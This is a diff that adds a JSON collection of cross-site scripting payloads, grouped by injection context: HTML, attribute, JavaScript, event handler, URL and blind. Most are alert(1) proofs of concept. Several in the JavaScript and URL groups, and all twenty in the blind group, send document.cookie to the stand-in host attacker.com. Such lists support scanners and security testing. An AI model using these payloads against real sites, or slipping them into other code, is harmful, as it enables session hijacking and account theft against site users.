@@ -1,0 +1,148 @@
+{
+  "html": {
+    "description": "Payload for simple HTML context",
+    "vectors": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "<details open ontoggle=alert(1)>",
+      "<a href=javascript:alert(1)>click me</a>",
+      "<body onload=alert(1)>",
+      "<input autofocus onfocus=alert(1)>",
+      "<select autofocus onfocus=alert(1)>",
+      "<textarea autofocus onfocus=alert(1)>",
+      "<keygen autofocus onfocus=alert(1)>",
+      "<div/onmouseover='alert(1)'>style=width:100%;height:100%;position:fixed;left:0;top:0</div>",
+      "<marquee onstart=alert(1)>",
+      "<audio src onloadstart=alert(1)>",
+      "<video><source onerror=alert(1)>",
+      "<object onerror=alert(1)>",
+      "<embed src onload=alert(1)>",
+      "<iframe src onload=alert(1)>",
+      "<form action onsubmit=alert(1)>",
+      "<button onmouseover=alert(1)>",
+      "<isindex onmouseover=alert(1)>"
+    ]
+  },
+  "html_elements": {
+    "description": "Extended HTML element-based XSS vectors",
+    "file": "html_element_payloads.json"
+  },
+  "attribute": {
+    "description": "Payloads for attribute context",
+    "vectors": [
+      "\" onmouseover=alert(1) \"",
+      "' onmouseover=alert(1) '",
+      "` onmouseover=alert(1) `",
+      "\" onfocus=alert(1) autofocus \"",
+      "' onfocus=alert(1) autofocus '",
+      "\" onerror=alert(1) src=x \"",
+      "' onerror=alert(1) src=x '",
+      "\" onload=alert(1) src=x \"",
+      "' onload=alert(1) src=x '",
+      "\" onmouseover=alert(1) style=position:fixed;left:0;top:0;width:100%;height:100% \"",
+      "' onmouseover=alert(1) style=position:fixed;left:0;top:0;width:100%;height:100% '",
+      "\" onmouseover=alert(1) style=width:100%;height:100%;position:fixed;left:0;top:0 \"",
+      "' onmouseover=alert(1) style=width:100%;height:100%;position:fixed;left:0;top:0 '"
+    ]
+  },
+  "js": {
+    "description": "Payloads for JavaScript context",
+    "vectors": [
+      "alert(1)",
+      "confirm(1)",
+      "prompt(1)",
+      "eval('alert(1)')",
+      "setTimeout('alert(1)', 100)",
+      "setInterval('alert(1)', 100)",
+      "new Function('alert(1)')()",
+      "fetch('http://attacker.com?cookie='+document.cookie)",
+      "location='http://attacker.com?cookie='+document.cookie",
+      "document.location='http://attacker.com?cookie='+document.cookie",
+      "window.location='http://attacker.com?cookie='+document.cookie",
+      "document.write('<script>alert(1)</script>')",
+      "document.writeln('<script>alert(1)</script>')",
+      "document.open();document.write('<script>alert(1)</script>');document.close()",
+      "document.body.innerHTML='<img src=x onerror=alert(1)>'",
+      "document.documentElement.innerHTML='<img src=x onerror=alert(1)>'",
+      "document.body.outerHTML='<img src=x onerror=alert(1)>'",
+      "document.documentElement.outerHTML='<img src=x onerror=alert(1)>'",
+      "document.body.setAttribute('onload', 'alert(1)')",
+      "document.documentElement.setAttribute('onload', 'alert(1)')"
+    ]
+  },
+  "event": {
+    "description": "Payloads for event handler context",
+    "vectors": [
+      "onclick=alert(1)",
+      "onmouseover=alert(1)",
+      "onmouseout=alert(1)",
+      "onmousedown=alert(1)",
+      "onmouseup=alert(1)",
+      "onmousemove=alert(1)",
+      "onmouseenter=alert(1)",
+      "onmouseleave=alert(1)",
+      "onfocus=alert(1)",
+      "onblur=alert(1)",
+      "onchange=alert(1)",
+      "oninput=alert(1)",
+      "onsubmit=alert(1)",
+      "onreset=alert(1)",
+      "onselect=alert(1)",
+      "onkeydown=alert(1)",
+      "onkeyup=alert(1)",
+      "onkeypress=alert(1)",
+      "onerror=alert(1)",
+      "onload=alert(1)"
+    ]
+  },
+  "url": {
+    "description": "Payloads for URL context",
+    "vectors": [
+      "javascript:alert(1)",
+      "javascript:confirm(1)",
+      "javascript:prompt(1)",
+      "javascript:eval('alert(1)')",
+      "javascript:fetch('http://attacker.com?cookie='+document.cookie)",
+      "javascript:location='http://attacker.com?cookie='+document.cookie",
+      "javascript:document.location='http://attacker.com?cookie='+document.cookie",
+      "javascript:window.location='http://attacker.com?cookie='+document.cookie",
+      "data:text/html,<script>alert(1)</script>",
+      "data:text/html,<img src=x onerror=alert(1)>",
+      "data:text/html,<svg onload=alert(1)>",
+      "data:text/html,<details open ontoggle=alert(1)>",
+      "data:text/html,<a href=javascript:alert(1)>click me</a>",
+      "data:text/html,<body onload=alert(1)>",
+      "data:text/html,<input autofocus onfocus=alert(1)>",
+      "data:text/html,<select autofocus onfocus=alert(1)>",
+      "data:text/html,<textarea autofocus onfocus=alert(1)>",
+      "data:text/html,<keygen autofocus onfocus=alert(1)>",
+      "data:text/html,<div/onmouseover='alert(1)'>style=width:100%;height:100%;position:fixed;left:0;top:0</div>"
+    ]
+  },
+  "blind": {
+    "description": "Blind XSS payloads",
+    "vectors": [
+      "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
+      "<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<svg onload=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<details open ontoggle=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<a href=javascript:fetch('http://attacker.com?cookie='+document.cookie)>click me</a>",
+      "<body onload=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<input autofocus onfocus=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<select autofocus onfocus=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<textarea autofocus onfocus=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<keygen autofocus onfocus=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<div/onmouseover='fetch(\"http://attacker.com?cookie=\"+document.cookie)'>style=width:100%;height:100%;position:fixed;left:0;top:0</div>",
+      "<marquee onstart=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<audio src onloadstart=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<video><source onerror=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<object onerror=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<embed src onload=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<iframe src onload=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<form action onsubmit=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<button onmouseover=fetch('http://attacker.com?cookie='+document.cookie)>",
+      "<isindex onmouseover=fetch('http://attacker.com?cookie='+document.cookie)>"
+    ]
+  }
+} 
